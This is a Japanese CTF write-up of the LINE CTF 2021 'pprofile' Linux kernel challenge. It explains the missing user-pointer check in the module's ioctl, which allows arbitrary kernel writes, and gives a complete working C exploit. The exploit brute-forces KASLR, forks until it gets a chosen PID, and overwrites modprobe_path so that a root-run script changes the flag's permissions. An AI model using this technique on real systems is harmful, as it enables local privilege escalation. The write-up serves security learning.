keywords
copy_user_generic_unrolled, pointer validation, modprobe_path

# イントロ
いつぞや開催されたLINE CTF 2021。最近kernel問を解いているのでkernel問を解こうと思って望んだが解けませんでした。このエントリの前半は問題の概要及び自分がインタイムに考えたことをまとめていて、後半で実際に動くexploitの概要を書いています。尚、本exploitは[@sampritipanda](https://gist.github.com/sampritipanda)さんの[PoC](https://gist.github.com/sampritipanda/3ad8e88f93dd97e93f070a94a791bff6)を完全に参考にしています。というかほぼ写経しています。過去のCTFの問題を復習する時に結構この人のPoCを参考にすることが多いので、いつもかなり感謝しています。
今回、振り返ってみるとかなり明らかな、自明と言うか、誘っているようなバグがあったにも関わらず全然気づけなかったので、反省しています。嘘です。コーラ飲んでます。

# static
```static.sh
/ $ cat /proc/version
Linux version 5.0.9 (ubuntu@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.11)) #1 SMP 9
$ cat ./run
qemu-system-x86_64 -cpu kvm64,+smep,+smap \
  -m 128M \
  -kernel ./bzImage \
  -initrd ./initramfs.cpio \
  -nographic \
  -monitor /dev/null \
  -no-reboot \
  -append "root=/dev/ram rw rdinit=/root/init console=ttyS0 loglevel=3 oops=panic panic=1"
$ modinfo ./pprofile.ko
filename:       /home/wataru/Documents/ctf/line2021/pprofile/work/./pprofile.ko
license:        GPL
author:         pprofile
srcversion:     35894B85C84616BDF4E3CE4
depends:
retpoline:      Y
name:           pprofile
vermagic:       5.0.9 SMP mod_unload modversions
```
SMEP有効・SMAP有効・KAISER有効・KASLR有効・oops->panic・シングルコアSMP。ソース配布なし。

# Module
`ioctl`のみを実装したデバイスを登録している。コマンドは3つ存在し、それぞれ大凡以下のことをする。

## PP_REGISTER: 0x20
クエリは以下の構造。また、内部では2つの構造体が使われる。
```query.c
struct ioctl_query{
    char *comm;
    char *result;
}
struct unk1{
    char *comm;
    struct unk2 *ptr;
}
struct unk2{
    ulong NOT_USED;
    uint pid;
    uint length;
}
struct unk1 storages[0x10]; // global
```
ユーザから指定された`comm`が`storages`に存在していなければ新しく`unk1`と`unk2`を`kmalloc/kmem_cache_alloc_trace()`で確保し、callerのPIDや指定された`comm`及びそのlengthを格納する。この際に、`comm`のlengthに応じて以下の謎の処理があるが、これが何をしているかは分からなかった。
```unk_source.c
    else {
      uVar5 = (uint)offset;
                    /* n <= 6 */
      if (uVar5 < 0x8) {
        if ((offset & 0x4) == 0x0) {
                    /* n <= 3 */
          if ((uVar5 != 0x0) && (*__dest = '\0', (offset & 0x2) != 0x0)) {
            *(undefined2 *)(__dest + ((offset & 0xffffffff) - 0x2)) = 0x0;
          }
        }
        else {
                    /* 4 <= n <= 6 */
          *(undefined4 *)__dest = 0x0;
          *(undefined4 *)(__dest + ((offset & 0xffffffff) - 0x4)) = 0x0;
        }
      }
      else {
                    /* n == 7 */
        *(undefined8 *)(__dest + ((offset & 0xffffffff) - 0x8)) = 0x0;
        if (0x7 < uVar5 - 0x1) {
          uVar4 = 0x0;
          do {
            offset = (ulong)uVar4;
            uVar4 = uVar4 + 0x8;
            *(undefined8 *)(__dest + offset) = 0x0;
          } while (uVar4 < (uVar5 - 0x1 & 0xfffffff8));
        }
      }
```

## PP_DESTROY: 0x40
`storages`から指定された`comm`を持つエントリを探して、`kfree()`及びNULLクリアするのみ。

## PP_ASK: 0x10
指定された`comm`に該当する`storages`のエントリの`unk2`構造体が持つ値を、指定された`query.result`にコピーする。このコピーでは以下のように`put_user_size()`という関数が使われている。
```pp_ask.c
                    /* Found specified entry */
            uVar5 = unk1->info2->pid;
            uVar4 = unk1->info2->length;
            put_user_size(NULL,l58_query.result,0x4);
            iVar2 = extraout_EAX;
            if ((extraout_EAX != 0x0) ||
               (put_user_size((char *)(ulong)uVar5,comm + 0x8,0x4), iVar2 = extraout_EAX_00,
               extraout_EAX_00 != 0x0)) goto LAB_001001a0;
            put_user_size((char *)(ulong)uVar4,comm + 0xc,0x4);
```
この関数は、内部で`copy_user_generic_unrolled()`という関数を用いてコピーを行っている。この関数の存在を知らなかったのだが、`/arch/x86/lib/copy_user_64.S`でアセンブラで書かれた関数でuserlandに対するコピーを行うらしい。先頭にある`STAC`命令は一時的にSMAPを無効にする命令である。
```copy_user_64.S
ENTRY(copy_user_generic_unrolled)
	ASM_STAC
	cmpl $8,%edx
	jb 20f		/* less then 8 bytes, go to byte copy loop */
	ALIGN_DESTINATION
	movl %edx,%ecx
	andl $63,%edx
	shrl $6,%ecx
	jz .L_copy_short_string
1:	movq (%rsi),%r8
(snipped...)
```
**この時点で、明らかにこれが自明なバグであることに気づくべきだった**。まぁ、後述。


# 期間中に考えたこと(FAIL)
絶対にレースだと思ってた。というのも、リバースしたコードが、それはもうTOCTOU臭が漂いまくっていた。いや、本当は漂ってなかったかも知れないが、絶対そうだと思いこんでいた。一番有力なのは以下の部分だと思ってた。
```sus.c
      if (command == 0x10) {
        iVar2 = strncpy_from_user(&l41_user_comm,l58_query.userbuf,0x8);
        if ((iVar2 == 0x0) || (iVar2 == 0x9)) goto LAB_00100341;
        if (iVar2 < 0x0) goto LAB_001001a0;
        p_storage = storages;
        do {
          unk1 = *p_storage;
          if ((unk1 != NULL) &&
             (iVar2 = strcmp(unk1->comm,(char *)&l41_user_comm), comm = l58_query.result,
             iVar2 == 0x0)) {
                    /* Found specified entry */
            uVar5 = unk1->info2->pid;
            uVar4 = unk1->info2->length;
            put_user_size(NULL,l58_query.result,0x4);
            iVar2 = extraout_EAX;
            if ((extraout_EAX != 0x0) ||
               (put_user_size((char *)(ulong)uVar5,comm + 0x8,0x4), iVar2 = extraout_EAX_00,
               extraout_EAX_00 != 0x0)) goto LAB_001001a0;
            put_user_size((char *)(ulong)uVar4,comm + 0xc,0x4);
```
userから指定された`comm`を`strncpy_from_user()`でコピーした後に、合致するエントリがあるかを`storages`から探し、見つかったならばその結果を`query.result`にコピーしている。ここだけが唯一`storages`からの検索後にもユーザランドへのアクセスがあったため、ここでuffdしてTOCTOUするものだと思った。処理を止めている間に該当エントリを`PP_DESTROY`して何か他のオブジェクトを入れた後にreadするんじゃないかと思った。だが、実際の処理ではユーザアクセス(`put_user_size()`)の前にpidとlengthをスタックに積んでいるため、少なくともuffdによるレースは失敗する。なんかうまいこと`storages`の検索後からスタックに積むまでの間に処理が移ったら良いんじゃないかとも思ったが、だいぶしんどそう。しかも、この方法だとleakができたとしてもwriteする手段がないためどっちにしろ詰むことになったと思う。
レースの線に固執しすぎていたのと、あと単純にリバースが下手でバイナリを読み間違えていたのもあって、解けなかった。

# Vuln
以下、完全に[@sampritipanda](https://gist.github.com/sampritipanda)さんの[PoC](https://gist.github.com/sampritipanda/3ad8e88f93dd97e93f070a94a791bff6)をパクっています。
上述したが、ユーザランドへのコピーに`copy_user_generic_unrolled()`を使っている。この関数のことを読み飛ばしていたのだが、kernelを読んでみると、この関数はCPUが`rep movsq`等の効率的なコピーに必要な命令のマイクロコードをサポートしていない場合に呼ばれる関数らしい。
```uaccess_64.h
copy_user_generic(void *to, const void *from, unsigned len)
{
	unsigned ret;

	/*
	 * If CPU has ERMS feature, use copy_user_enhanced_fast_string.
	 * Otherwise, if CPU has rep_good feature, use copy_user_generic_string.
	 * Otherwise, use copy_user_generic_unrolled.
	 */
	alternative_call_2(copy_user_generic_unrolled,
			 copy_user_generic_string,
			 X86_FEATURE_REP_GOOD,
			 copy_user_enhanced_fast_string,
			 X86_FEATURE_ERMS,
			 ASM_OUTPUT2("=a" (ret), "=D" (to), "=S" (from),
				     "=d" (len)),
			 "1" (to), "2" (from), "3" (len)
			 : "memory", "rcx", "r8", "r9", "r10", "r11");
	return ret;
}
```
そして、この`copy_user_generic()`自体は通常の`copy_from_user()`から呼ばれる関数である。(`raw_copy_from_user()`経由)
```usercopy.c
unsigned long _copy_from_user(void *to, const void __user *from, unsigned long n)
{
	unsigned long res = n;
	might_fault();
	if (likely(access_ok(from, n))) {
		kasan_check_write(to, n);
		res = raw_copy_from_user(to, from, n);
	}
	if (unlikely(res))
		memset(to + (n - res), 0, res);
	return res;
}
EXPORT_SYMBOL(_copy_from_user);
```
はい。上の関数を見れば分かるが、`raw_copy_from_user()`を呼び出す前には`access_ok()`を呼んで、指定されたユーザランドポインタがvalidなものであるかをチェックする必要がある。つまり、`copy_user_generic_unrolled()`自体はこのチェックが既に済んでおり、ポインタはvalidなものとして扱う。よって、**query.resultにkernellandのポインタを渡してしまえばAAWが実現される**。

# 方針
`PP_ASK`で書き込まれる値は、`comm`の`length`・PID、及び使用されていない常に0の8byteである(これナニ？)。この内`comm`はlengthが1~7に限定されているため、任意に操作できるのはPIDだけである。`fork()`を所望のPIDになるまで繰り返せば任意の値を書き込むことができる。
任意書き込みができる場合に一番楽なのは`modprobe_path`である。この際、KASLRが有効だからleakしなくちゃいけないと思ったら、意外とbruteforceでなんとかなるらしい。エントロピーは、以下の試行でも分かるように1byteのみである。**readのbruteforceならまだしも、writeのbruteforceでも意外とkernelはcrashしないらしい**。勉強になった。
```ex.txt
ffffffff82256f40 D modprobe_path
ffffffff90256f40 D modprobe_path
ffffffff96256f40 D modprobe_path
```

# exploit
```exploit.c

/** This PoC is completely based on https://gist.github.com/sampritipanda/3ad8e88f93dd97e93f070a94a791bff6 **/

#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


// commands
#define DEV_PATH "/dev/pprofile"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000UL
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

/*** GLOBALS *****/
void *mmap_addr;
int fd;
char inbuf[PAGE];
char outbuf[PAGE];
/********************/

#define PP_REGISTER 0x20
#define PP_DESTROY 0x40
#define PP_ASK 0x10

struct query{
  char *buf;
  char *result;
};

void _register(int fd, char *buf){
  printf("[.] register: %d %p(%s)\n", fd, buf, buf);
  struct query q = {
      .buf = buf};
  int ret = ioctl(fd, PP_REGISTER, &q);
  printf("[reg] %d\n", ret);
}

void _destroy(int fd, char *buf){
  printf("[.] destroy: %d %p(%s)\n", fd, buf, buf);
  struct query q = {
      .buf = buf
  };
  int ret = ioctl(fd, PP_DESTROY, &q);
  printf("[des] %d\n", ret);
}

void _ask(int fd, char *buf, char *obuf){
  printf("[.] ask: %d %p %p\n", fd, buf, obuf);
  struct query q = {
      .buf = buf,
      .result = obuf
  };
  int ret = ioctl(fd, PP_ASK, &q);
  printf("[ask] %d\n", ret);
}

void ack_pid(int pid, void (*f)(ulong), ulong arg){
  while(1==1){
    int cur = fork();
    if(cur == 0){ // child
      if(getpid() % 0x100 == 0){
        printf("[-] 0x%x\n", getpid());
      }
      if(getpid() == pid){
        f(arg);
      }
      exit(0);
    }else{ // parent
      wait(NULL);
      if(cur == pid)
        break;
    }
  }
}

void sub_aaw(ulong offset){
  for (int ix = 0; ix != 0xFF; ++ix){
    ulong target = 0xffffffff00000000UL
                    + ix * 0x01000000UL
                    + offset;
    _register(fd, inbuf);
    _ask(fd, inbuf, (char *)target);
    _destroy(fd, inbuf);
  }
}

void aaw(ulong offset, unsigned val){
  ack_pid(val, &sub_aaw, offset);
}

int main(int argc, char *argv[]) {
  char s_evil[] = "/tmp/a\x00";
  memset(inbuf, 0, 0x200);
  memset(outbuf, 0, 0x200);
  strcpy(inbuf, "ABC\x00");
  fd = open(DEV_PATH, O_RDONLY);
  assert(fd >= 2);

  // setup for modprobe_path overwrite
  system("echo -ne '#!/bin/sh\nchmod 777 /root/flag' > /tmp/a");
  system("chmod +x /tmp/a");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/nirugiri");
  system("chmod +x /tmp/nirugiri");

  for(int ix=0;ix<strlen(s_evil);ix+=2){
    printf("[+] writing %x.......\n", *((unsigned short*)(s_evil+ix)));
    aaw(0x256f40 - 0x10 + 8 + ix, *((unsigned short*)(s_evil+ix)));
  }

  // invoke user_mod_helper
  system("/tmp/nirugiri");

  return 0;
}

/*
ffffffff82256f40 D modprobe_path
ffffffff90256f40 D modprobe_path
ffffffff96256f40 D modprobe_path
*/
```

# アウトロ
この、無能め！！！！


# symbols without KASLR
```
/ # cat /proc/kallsyms | grep pprofile
0xffffffffc0002460 t pprofile_init        [pprofile]
0xffffffffc00044d0 b __key.27642  [pprofile]
0xffffffffc00030a0 r pprofile_fops        [pprofile]
0xffffffffc0002570 t pprofile_exit        [pprofile]
0xffffffffc00032bc r _note_6      [pprofile]
0xffffffffc0004440 b p    [pprofile]
0xffffffffc0004000 d pprofile_major       [pprofile]
0xffffffffc0004040 d __this_module        [pprofile]
0xffffffffc0002570 t cleanup_module       [pprofile]
0xffffffffc00044c8 b pprofile_class       [pprofile]
0xffffffffc0002460 t init_module  [pprofile]
0xffffffffc0002000 t put_user_size        [pprofile]
0xffffffffc0002050 t pprofile_ioctl       [pprofile]
0xffffffffc0004460 b cdev [pprofile]
0xffffffffc00043c0 b storages     [pprofile]
```

# 参考
sampritipandaさんのPoC
https://gist.github.com/sampritipanda/3ad8e88f93dd97e93f070a94a791bff6
